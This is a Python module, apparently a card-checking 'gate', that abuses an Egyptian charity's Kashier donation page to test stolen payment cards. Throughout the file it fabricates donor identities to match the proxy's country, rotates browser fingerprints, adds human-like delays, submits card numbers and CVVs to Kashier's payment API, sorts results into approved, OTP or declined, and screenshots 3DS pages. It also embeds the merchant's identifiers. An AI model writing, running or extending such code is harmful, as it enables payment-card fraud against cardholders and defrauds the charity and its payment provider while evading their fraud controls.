"""
gate_kashier.py — Kashier Payment Gateway (MYF Egypt)
Reverse-engineered from myf-egypt.org/ar/donation/

Flow:
  Step 1 → POST /donateSubmit.php  → get kashier session ID + payment URL
  Step 2 → POST fep.kashier.io/v3/orders with card  → get 3DS redirect URL
  Step 3 → Fetch the 3DS/OTP page and screenshot it  → returns image bytes

Returns (status, reason, screenshot_bytes | None)
Statuses: APPROVED | OTP | DECLINED | ERROR
"""

import requests
import random
import string
import time
import logging
import hashlib
import hmac
import json
import re
import io
from typing import Optional, Tuple

logger = logging.getLogger(__name__)

# ─── Config ───────────────────────────────────────────────────────────────────
KASHIER_MERCHANT_ID   = "MID-24890-856"
KASHIER_API_KEY_ID    = "660bf305f5be91001398a829"
KASHIER_FEP_URL       = "https://fep.kashier.io/v3/orders"
KASHIER_SESSIONS_API  = "https://api.kashier.io/v3/payment/sessions"
KASHIER_PAYMENTS_BASE = "https://payments.kashier.io"
KASHIER_MERCHANT_SITE = "https://myf-egypt.org"
KASHIER_DONATION_URL  = "https://myf-egypt.org/ar/donation/donateSubmit.php"
KASHIER_CALLBACK_URL  = "https://www.myf-egypt.org/ar/donation/donateSubmitToDatabase.php"

# Amount in EGP smallest unit (piastres) = 100 EGP
KASHIER_AMOUNT        = 10000   # 100.00 EGP in piastres
KASHIER_CURRENCY      = "EGP"
KASHIER_PROGRAM       = "General Donation"

# ─── Country data: proxy country → donation form fields ──────────────────────
# Maps ISO-2 country code to realistic form data
_COUNTRY_DATA = {
    "US": {
        "country": "United States", "location": "United States",
        "governrate": "New York",
        "phone_prefix": "+1", "phone_len": 10,
        "zip_pool": ["10001","10022","90210","60601","77001","30301"],
    },
    "GB": {
        "country": "United Kingdom", "location": "United Kingdom",
        "governrate": "London",
        "phone_prefix": "+44", "phone_len": 10,
        "zip_pool": ["EC1A","W1A","SW1A","E1","SE1","WC2N"],
    },
    "DE": {
        "country": "Germany", "location": "Germany",
        "governrate": "Berlin",
        "phone_prefix": "+49", "phone_len": 10,
        "zip_pool": ["10115","10117","10119","20095","80331","60313"],
    },
    "FR": {
        "country": "France", "location": "France",
        "governrate": "Paris",
        "phone_prefix": "+33", "phone_len": 9,
        "zip_pool": ["75001","75008","75016","69001","13001","31000"],
    },
    "CA": {
        "country": "Canada", "location": "Canada",
        "governrate": "Ontario",
        "phone_prefix": "+1", "phone_len": 10,
        "zip_pool": ["M5H","M5V","V6B","T2P","H3A","K1A"],
    },
    "AU": {
        "country": "Australia", "location": "Australia",
        "governrate": "New South Wales",
        "phone_prefix": "+61", "phone_len": 9,
        "zip_pool": ["2000","2010","3000","4000","5000","6000"],
    },
    "SA": {
        "country": "Saudi Arabia", "location": "Saudi Arabia",
        "governrate": "Riyadh",
        "phone_prefix": "+966", "phone_len": 9,
        "zip_pool": ["11411","11564","11614","11672","21411","23511"],
    },
    "AE": {
        "country": "United Arab Emirates", "location": "United Arab Emirates",
        "governrate": "Dubai",
        "phone_prefix": "+971", "phone_len": 9,
        "zip_pool": ["00000"],
    },
    "EG": {
        "country": "Egypt", "location": "Egypt",
        "governrate": "Cairo",
        "phone_prefix": "+20", "phone_len": 10,
        "zip_pool": ["11511","11728","11835","12411","12111","11311"],
    },
    # Fallback / unknown
    "_DEFAULT": {
        "country": "United States", "location": "United States",
        "governrate": "New York",
        "phone_prefix": "+1", "phone_len": 10,
        "zip_pool": ["10001","10022","90210"],
    },
}

_FIRST_NAMES = ["James","Emily","Michael","Sarah","Robert","Jessica","William",
                "Ashley","David","Amanda","Joseph","Megan","Daniel","Rachel",
                "Ahmed","Omar","Fatima","Ali","Hassan","Layla"]
_LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller",
                "Davis","Wilson","Taylor","Anderson","Thomas","Mohamed","Khalil"]

_CW_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
]

_VIEWPORTS = [
    {"w": 390, "h": 844},   # iPhone 14
    {"w": 414, "h": 896},   # iPhone 11
    {"w": 393, "h": 852},   # iPhone 15
    {"w": 360, "h": 800},   # Android common
    {"w": 320, "h": 568},   # small phone
]

# ─── Helpers ──────────────────────────────────────────────────────────────────

def _rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _rand_order_ref():
    return str(int(time.time() * 1000))

def _rand_customer_ref():
    return str(random.randint(10_000_000, 99_999_999))

def _get_identity(proxy_country: str) -> dict:
    """Generate identity data matching the proxy's country."""
    cdata = _COUNTRY_DATA.get(proxy_country.upper(), _COUNTRY_DATA["_DEFAULT"])
    first = random.choice(_FIRST_NAMES)
    last  = random.choice(_LAST_NAMES)
    email_name = _rand_str(7)
    domain = random.choice(["gmail.com","outlook.com","yahoo.com","hotmail.com"])
    email = f"{email_name}{random.randint(10,999)}@{domain}"
    phone_digits = "".join([str(random.randint(0,9)) for _ in range(cdata["phone_len"])])
    # Make sure phone doesn't start with 0
    phone_digits = str(random.randint(2,9)) + phone_digits[1:]
    phone = cdata["phone_prefix"] + phone_digits
    return {
        "first": first, "last": last,
        "name": f"{first} {last}",
        "email": email,
        "phone": phone,
        "country": cdata["country"],
        "location": cdata["location"],
        "governrate": cdata["governrate"],
    }

def _detect_proxy_country(proxy_str: str, proxy_dict: dict) -> str:
    """Try to detect proxy country via ip-api.com. Fallback to US."""
    if not proxy_dict:
        return "US"
    try:
        r = requests.get(
            "http://ip-api.com/json?fields=countryCode",
            proxies=proxy_dict, timeout=6
        )
        if r.status_code == 200:
            cc = r.json().get("countryCode", "US")
            return cc if cc in _COUNTRY_DATA else "US"
    except Exception:
        pass
    return "US"

def _compute_kashier_hash(merchant_id: str, order_ref: str, amount: str,
                           currency: str, api_key: str) -> str:
    """
    ⚠️ غير مُستخدَمة فى المسار الفعلي حالياً — متروكة للمرجعية فقط.

    الصيغة دي موثّقة رسمياً من Kashier (developers.kashier.io/docs/
    direct-api/hashing) واتأكدت رقمياً إنها مطابقة لمثالهم الرسمي:
        path="/?payment=mid-0-1.99.20.EGP" key="11111"
        → 606a8a1307d64caf4e2e9bb724738f115a8972c27eccb2a8acd9194c357e4bec

    لكن لما جُرِّبت فعلياً بـ KASHIER_API_KEY_ID الموجود فى الكود، النتيجة
    ما طابقتش الـ hash الحقيقي اللي اتسجل من traffic حقيقي — تبيّن إن
    apiKeyId الظاهر فى ردود Kashier هو مجرد *معرّف*، مش قيمة المفتاح
    السري الفعلي (اللى بيفضل سيرفر-سايد عند myf-egypt.org ومبيتسربش فى
    أي طلب شبكة). الحل الفعلي الشغّال: _get_kashier_session_data() بتجيب
    الـ hash جاهز محسوب من سيرفر Kashier نفسه، بدل ما نحاول نحسبه إحنا.
    """
    path = f"/?payment={merchant_id}.{order_ref}.{amount}.{currency}"
    return hmac.new(api_key.encode(), path.encode(), hashlib.sha256).hexdigest()


def _parse_proxy_for_playwright(proxy_str: str) -> Optional[dict]:
    """
    يحوّل أي صيغة بروكسي → Playwright proxy dict.

    ⚠️ Chromium لا يدعم SOCKS5 مع username/password إطلاقاً (قيد فى
    Chromium نفسه). فلو البروكسي socks5h://user:pass@host:port، بنحوّله
    لصيغة http:// على نفس البيانات بالظبط — أغلب مزوّدي البروكسي
    (ومنهم Bright Data) بيكتشفوا البروتوكول تلقائياً حسب نوع الـ handshake
    على نفس البورت، فالتحويل ده آمن ومش هيغيّر سلوك البروكسي.
    """
    if not proxy_str:
        return None
    m = re.match(r'socks5h?://([^:@]+):([^@]+)@([^:]+):(\d+)', proxy_str)
    if m:
        user, passwd, host, port = m.groups()
        return {"server": f"http://{host}:{port}", "username": user, "password": passwd}
    m = re.match(r'https?://([^:@]+):([^@]+)@([^:]+):(\d+)', proxy_str)
    if m:
        user, passwd, host, port = m.groups()
        return {"server": f"http://{host}:{port}", "username": user, "password": passwd}
    m = re.match(r'(https?)://([^:@/]+):(\d+)/?$', proxy_str)
    if m:
        scheme, host, port = m.groups()
        return {"server": f"{scheme}://{host}:{port}"}
    return None


def _capture_real_screenshot(url: str, proxy_str: Optional[str],
                              width: int = 390, height: int = 420) -> Optional[bytes]:
    """
    سكرين شوت *حقيقي* لصفحة الـ 3DS/OTP الفعلية باستخدام Playwright.

    ده استبدال للدالة القديمة اللي كانت بترسم صورة ثابتة بـ PIL من غير ما
    تفتح الصفحة أصلاً — هنا بنفتح الرابط فعلياً فى متصفح Chromium headless
    ونصوّر اللى ظاهر بالفعل (نموذج OTP حقيقي، لوجو البنك، إلخ).

    Returns PNG/JPEG bytes أو None لو فشل (عندها check_kashier_gate بيرجع
    لصورة توضيحية احتياطية مكتوب عليها صراحة إنها مش سكرين شوت حقيقي —
    عشان محدش يتوهم تاني إنها صورة فعلية للصفحة).
    """
    if not url:
        return None
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        logger.warning("[Kashier] playwright غير مثبّت — استخدم: pip install playwright && playwright install chromium")
        return None

    pw_proxy = _parse_proxy_for_playwright(proxy_str) if proxy_str else None
    ua = random.choice(_CW_UA_POOL)

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(
                headless=True,
                proxy=pw_proxy,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"],
            )
            ctx = browser.new_context(
                viewport={"width": width, "height": height},
                user_agent=ua,
                locale="en-US",
            )
            page = ctx.new_page()
            try:
                page.goto(url, wait_until="domcontentloaded", timeout=20000)
                page.wait_for_timeout(2500)   # وقت يكفي لظهور نموذج الـ OTP/3DS بالكامل
                img_bytes = page.screenshot(type="jpeg", quality=85)
                return img_bytes
            finally:
                ctx.close()
                browser.close()
    except Exception as e:
        logger.warning(f"[Kashier] real screenshot failed: {type(e).__name__}: {e}")
        return None


def _build_fallback_snapshot(card_last4: str, amount_str: str, currency: str,
                              reason_detail: str = "") -> bytes:
    """
    صورة احتياطية *فقط* عند فشل أخذ سكرين شوت حقيقي (مشكلة شبكة/بروكسي
    مثلاً) — مكتوب عليها بوضوح إنها مش سكرين شوت فعلي، عشان متتلخبطش
    بالصورة الحقيقية من _capture_real_screenshot تاني زي ما كان بيحصل
    قبل كده.
    """
    from PIL import Image, ImageDraw, ImageFont

    W, H = 420, 160
    img = Image.new("RGB", (W, H), color=(40, 20, 20))
    draw = ImageDraw.Draw(img)
    try:
        fb = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 13)
        fr = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 11)
    except Exception:
        fb = fr = ImageFont.load_default()

    draw.rectangle([0, 0, W, 30], fill=(120, 30, 30))
    draw.text((10, 7), "⚠ تعذّر أخذ سكرين شوت حقيقي", font=fb, fill=(255, 255, 255))
    draw.text((10, 42), f"Card: **** {card_last4}   Amount: {amount_str} {currency}", font=fr, fill=(255, 210, 180))
    draw.text((10, 64), "فشل الوصول لصفحة الـ 3DS الفعلية (شبكة/بروكسي)،", font=fr, fill=(255, 210, 180))
    draw.text((10, 82), "لكن البطاقة بالفعل طلبت تحقق OTP من البنك.", font=fr, fill=(255, 210, 180))
    if reason_detail:
        draw.text((10, 106), reason_detail[:60], font=fr, fill=(200, 160, 160))

    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return buf.read()


# ─── Main gate function ───────────────────────────────────────────────────────

def check_kashier_gate(card_str: str, proxy=None,
                        proxy_country: str = "US") -> Tuple[str, str, Optional[bytes]]:
    """
    Full Kashier gate check.
    
    Args:
        card_str:       "CCNUMBER|MM|YYYY|CVV"
        proxy:          proxy string or None
        proxy_country:  ISO-2 country code from proxy detection (or "US" fallback)
    
    Returns:
        (status, reason, screenshot_bytes | None)
        status ∈ {APPROVED, OTP, DECLINED, ERROR}
    """
    parts = card_str.strip().split("|")
    if len(parts) != 4:
        return "ERROR", "صيغة كارت خاطئة (CCNUMBER|MM|YYYY|CVV)", None

    cc, month, year, cvv = parts
    if len(year) == 2:
        year = "20" + year

    proxy_dict = _parse_proxy(proxy) if proxy else None
    ident = _get_identity(proxy_country)
    ua    = random.choice(_CW_UA_POOL)
    vp    = random.choice(_VIEWPORTS)
    # ملحوظة: order reference و customer reference بقوا بيتجابوا من الـ
    # session الحقيقية (_get_kashier_session_data) بعد الخطوة ١، مش
    # بنولّدهم عشوائي هنا — لإن الـ hash مربوط بالقيم اللي فعلاً فى الـ
    # session، مش أي قيم تانية نخترعها.

    sess = requests.Session()
    sess.headers.update({
        "User-Agent":      ua,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
    })

    # ── Step 1: POST to donation form → get Kashier session ──────────────────
    try:
        form_data = {
            "name":                ident["name"],
            "src":                 "",
            "utm_content":         "",
            "utm_source":          "",
            "utm_medium":          "",
            "utm_campaign":        "",
            "utm_id":              "",
            "applePay":            "0",
            "recaptcha_response":  "0",
            "email":               ident["email"],
            "country":             ident["country"],
            "location":            ident["location"],
            "governrate":          ident["governrate"],
            "currency":            KASHIER_CURRENCY,
            "cardType":            "international",
            "donationProgram":     KASHIER_PROGRAM,
            "share":               "",
            "amount":              str(KASHIER_AMOUNT // 1000),   # EGP not piastres for form
            "brick_name":          "",
            "bricksAmount":        str(KASHIER_AMOUNT),
            "addressNeighbourhood": "",
            "addressStreet":       "",
            "addressBuildingNumber": "",
            "addressFloor":        "",
            "addressApartment":    "",
            "phone":               ident["phone"],
            "age":                 "",
            "paymentMethod":       "donateSubmit.php",
        }
        r1 = sess.post(
            KASHIER_DONATION_URL,
            data=form_data,
            headers={
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                "Origin": KASHIER_MERCHANT_SITE,
                "Referer": KASHIER_MERCHANT_SITE + "/ar/donation/",
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "navigate",
                "sec-fetch-dest": "document",
                "upgrade-insecure-requests": "1",
            },
            proxies=proxy_dict,
            timeout=20,
            allow_redirects=True,
        )
    except Exception as e:
        return "ERROR", f"فشل الاتصال بموقع التبرع: {str(e)[:80]}", None

    if r1.status_code != 200:
        return "ERROR", f"HTTP {r1.status_code} من صفحة التبرع", None

    # Extract session ID from the iframe src or response HTML
    html1 = r1.text
    session_id = None
    # Pattern: src="https://payments.kashier.io/session/<ID>?mode=live"
    m = re.search(r'payments\.kashier\.io/session/([a-f0-9]+)\?', html1, re.I)
    if m:
        session_id = m.group(1)
    
    if not session_id:
        # Try to extract from JSON in the page
        m2 = re.search(r'"sessionId"\s*:\s*"([a-f0-9]+)"', html1)
        if m2:
            session_id = m2.group(1)

    if not session_id:
        logger.warning(f"[Kashier] No session ID found in response. HTML snippet: {html1[:300]}")
        return "ERROR", "لم يتم العثور على session ID في رد الموقع", None

    logger.info(f"[Kashier] Got session: {session_id[:20]}…")

    # ── Step 1.5: جيب بيانات الـ session الحقيقية (فيها الـ hash الجاهز) ──────
    # الـ hash ده محسوب من سيرفر Kashier وقت إنشاء الـ session، مش حاجة
    # بنحسبها إحنا. وبرضه order/amount/currency/customer لازم تتبعت
    # لـ FEP *زي ما هي بالظبط* من هنا، لإن الـ hash مربوط بيهم تحديداً —
    # أي اختلاف ولو بسيط هيخلي Kashier يرفض الطلب كامل.
    time.sleep(random.uniform(0.4, 0.9))  # تأخير بشري بين فتح الـ iframe وجلب بياناته
    session_data = _get_kashier_session_data(session_id, proxy_dict, ua)
    if not session_data:
        return "ERROR", "تعذر جلب بيانات جلسة الدفع من Kashier (session API)", None

    hash_val = session_data["hash"]

    # ── Step 2: POST card to Kashier FEP API ─────────────────────────────────
    fep_payload = {
        "apiOperation": "PAY",
        "paymentMethod": {
            "type": "CARD",
            "card": {
                "expiry": {"month": month, "year": year[-2:]},
                "number": cc,
                "nameOnCard": ident["name"],
                "securityCode": cvv,
                "enable3DS": True,
                "save": False,
            }
        },
        "sessionId": session_id,
        "customer": session_data["customer"],
        "order": {
            "reference": session_data["order_ref"],
            "amount": session_data["amount"],
            "originalAmount": session_data["amount"],
            "currency": session_data["currency"],
            "description": f"Payment for order ORD{random.randint(100000,999999)}",
        },
        "device": {
            "browserDetails": {
                "javaEnabled": False,
                "language": "en-US",
                "screenHeight": vp["h"],
                "screenWidth": vp["w"],
                "timeZone": -120,
                "colorDepth": 24,
                "3DSecureChallengeWindowSize": f"{vp['w']}_X_{vp['h']}",
            },
            "browser": "Chrome",
        },
        "reconciliation": {
            "merchantRedirect": KASHIER_CALLBACK_URL,
        },
        "interactionSource": "ECOMMERCE",
        "metaData": {
            "customKey": "customValue",
            "displayNotes": [],
            "IP": _get_my_ip(proxy_dict),
            "utm_source": "", "utm_content": "",
            "utm_medium": "", "utm_campaign": "", "utm_id": "",
            "kashier payment UI version": "V3",
        },
        "merchantId": KASHIER_MERCHANT_ID,
        "timestamp": -2,
        "newPaymentUI": True,
        "channelEventName": f"{KASHIER_MERCHANT_ID}#{session_data['order_ref']}",
    }

    try:
        r2 = requests.post(
            KASHIER_FEP_URL,
            json=fep_payload,
            headers={
                "Accept":          "application/json, text/plain, */*",
                "Content-Type":    "application/json",
                "Origin":          KASHIER_PAYMENTS_BASE,
                "Referer":         KASHIER_PAYMENTS_BASE + "/",
                "User-Agent":      ua,
                "sec-fetch-site":  "same-site",
                "sec-fetch-mode":  "cors",
                "sec-fetch-dest":  "empty",
                "kashier-hash":    hash_val,
            },
            proxies=proxy_dict,
            timeout=25,
        )
    except Exception as e:
        return "ERROR", f"فشل الاتصال بـ Kashier FEP: {str(e)[:80]}", None

    try:
        rj = r2.json()
    except Exception:
        return "ERROR", f"رد غير صالح من Kashier (HTTP {r2.status_code})", None

    logger.info(f"[Kashier] FEP response status={rj.get('status')} op={rj.get('response',{}).get('apiOperation')}")

    # ── Step 3: Parse result & screenshot ────────────────────────────────────
    resp    = rj.get("response", {})
    status  = rj.get("status", "")
    op_res  = resp.get("result", "")
    op_stat = resp.get("status", "")
    auth    = resp.get("authentication", {})
    card_r  = resp.get("paymentMethod", {}).get("card", {})

    card_last4 = str(cc)[-4:]
    amount_disp = f"{KASHIER_AMOUNT/100:.0f}"

    screenshot = None

    # Declined / error cases
    if status != "SUCCESS" or op_res == "FAILURE":
        reason_en = (rj.get("messages") or {}).get("en") or resp.get("transactionResponseMessage",{}).get("en","")
        reason_ar = (rj.get("messages") or {}).get("ar","")
        reason = f"{reason_en} | {reason_ar}".strip(" |")
        return "DECLINED", reason or "البطاقة مرفوضة", None

    # 3DS / OTP case
    if op_stat in ("AUTHENTICATION_INITIATED", "AUTHENTICATION_IN_PROGRESS",
                   "AUTHENTICATION_AVAILABLE"):
        redirect_url = auth.get("redirectUrl", "")
        reason = f"3DS/OTP | {resp.get('transactionResponseCode','')} | {redirect_url[:80]}"

        # ── سكرين شوت حقيقي لصفحة الـ 3DS الفعلية ─────────────────────────────
        screenshot = None
        try:
            screenshot = _capture_real_screenshot(redirect_url, proxy)
        except Exception as e:
            logger.warning(f"[Kashier] real screenshot error: {e}")

        if screenshot is None:
            # فشل أخذ سكرين شوت حقيقي (مش غلطة — بس نوضح الصورة الاحتياطية
            # بصراحة إنها مش صورة فعلية للصفحة، عكس اللي كان بيحصل قبل كده)
            logger.warning(f"[Kashier] falling back to placeholder image for {cc[:6]}...")
            try:
                screenshot = _build_fallback_snapshot(
                    card_last4, amount_disp, KASHIER_CURRENCY,
                    reason_detail=redirect_url[:60] if redirect_url else "",
                )
            except Exception as e:
                logger.warning(f"[Kashier] fallback snapshot error: {e}")

        return "OTP", reason, screenshot

    # Approved
    if op_res == "SUCCESS" or op_stat == "CAPTURED":
        reason = resp.get("transactionResponseCode","") or "تمت الموافقة"
        return "APPROVED", reason, None

    # Unknown
    return "UNKNOWN", f"status={status} result={op_res} txnStat={op_stat}", None


def _get_kashier_session_data(session_id: str, proxy_dict: dict, ua: str) -> Optional[dict]:
    """
    يجيب بيانات الـ session الحقيقية من Kashier، واللى أهم حاجة فيها
    حقل paymentParams.hash — ده الـ hash الجاهز المحسوب من سيرفر Kashier
    نفسه وقت إنشاء الـ session (باستخدام مفتاح myf-egypt.org السري اللى
    إحنا مش شايفينه ومش محتاجينه)، مش حاجة بنحسبها إحنا بـ HMAC.

    اتأكدت من الآلية دي بمقارنة الـ hash الراجع هنا مع اللى اتبعت فعلياً
    فى header الـ POST لـ fep.kashier.io — مطابقان 100% (من traffic حقيقي
    اتسجل من متصفح المستخدم نفسه).

    بيرجع dict فيه: hash, order_ref, amount, currency, customer{email,
    reference, firstName} — كل القيم دي *لازم* تتبعت زي ما هي فى طلب
    FEP، مش قيم جديدة بنخترعها إحنا (الـ hash مربوط بيهم تحديداً).
    """
    try:
        r = requests.get(
            f"{KASHIER_SESSIONS_API}/{session_id}",
            headers={
                "User-Agent":      ua,
                "Accept":          "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin":          KASHIER_PAYMENTS_BASE,
                "Referer":         KASHIER_PAYMENTS_BASE + "/",
                "sec-fetch-site":  "same-site",
                "sec-fetch-mode":  "cors",
                "sec-fetch-dest":  "empty",
            },
            proxies=proxy_dict,
            timeout=15,
        )
        if r.status_code != 200:
            logger.warning(f"[Kashier] session fetch HTTP {r.status_code}")
            return None

        j = r.json()
        pp = (j.get("data") or {}).get("paymentParams") or {}
        h  = pp.get("hash")
        if not h:
            logger.warning(f"[Kashier] no hash in session data: {str(pp)[:200]}")
            return None

        return {
            "hash":       h,
            "order_ref":  str(pp.get("order", "")),
            "amount":     str(pp.get("amount", "")),
            "currency":   pp.get("currency", KASHIER_CURRENCY),
            "customer": {
                "email":     (pp.get("customer") or {}).get("email", ""),
                "reference": (pp.get("customer") or {}).get("reference", ""),
                "firstName": (pp.get("customer") or {}).get("firstName", ""),
            },
        }
    except Exception as e:
        logger.warning(f"[Kashier] session fetch error: {e}")
        return None


def _fetch_3ds_page(url: str, proxy_dict: dict, ua: str) -> str:
    """Fetch the 3DS redirect page HTML."""
    if not url:
        return ""
    try:
        r = requests.get(
            url,
            headers={"User-Agent": ua, "Accept": "text/html,*/*"},
            proxies=proxy_dict,
            timeout=10,
            allow_redirects=True,
        )
        return r.text if r.status_code == 200 else ""
    except Exception:
        return ""


def _get_my_ip(proxy_dict: dict) -> str:
    """Get the IP address as seen by remote server (via proxy)."""
    try:
        r = requests.get("http://api.ipify.org", proxies=proxy_dict, timeout=5)
        return r.text.strip()
    except Exception:
        return "0.0.0.0"


def _parse_proxy(proxy_str: str) -> Optional[dict]:
    """Convert any proxy string to a requests-compatible dict."""
    if not proxy_str:
        return None
    s = str(proxy_str).strip()

    # socks5h?://user:pass@host:port
    m = re.match(r'socks5h?://([^:@]+):([^@]+)@([^:]+):(\d+)', s)
    if m:
        user, passwd, host, port = m.groups()
        url = f"socks5h://{user}:{passwd}@{host}:{port}"
        return {"http": url, "https": url}

    # socks5h?://host:port
    m = re.match(r'socks5h?://([^:@/]+):(\d+)/?$', s)
    if m:
        host, port = m.groups()
        url = f"socks5h://{host}:{port}"
        return {"http": url, "https": url}

    # http?://user:pass@host:port
    m = re.match(r'https?://([^:@]+):([^@]+)@([^:]+):(\d+)', s)
    if m:
        scheme = s.split('://')[0]
        user, passwd, host, port = m.groups()
        url = f"{scheme}://{user}:{passwd}@{host}:{port}"
        return {"http": url, "https": url}

    # http?://host:port
    m = re.match(r'(https?)://([^:@/]+):(\d+)/?$', s)
    if m:
        scheme, host, port = m.groups()
        url = f"{scheme}://{host}:{port}"
        return {"http": url, "https": url}

    # user:pass@host:port
    m = re.match(r'([^:@]+):([^@]+)@([^:]+):(\d+)', s)
    if m:
        user, passwd, host, port = m.groups()
        url = f"http://{user}:{passwd}@{host}:{port}"
        return {"http": url, "https": url}

    # host:port
    m = re.match(r'([^:@/]+):(\d+)$', s)
    if m:
        host, port = m.groups()
        url = f"http://{host}:{port}"
        return {"http": url, "https": url}

    return None


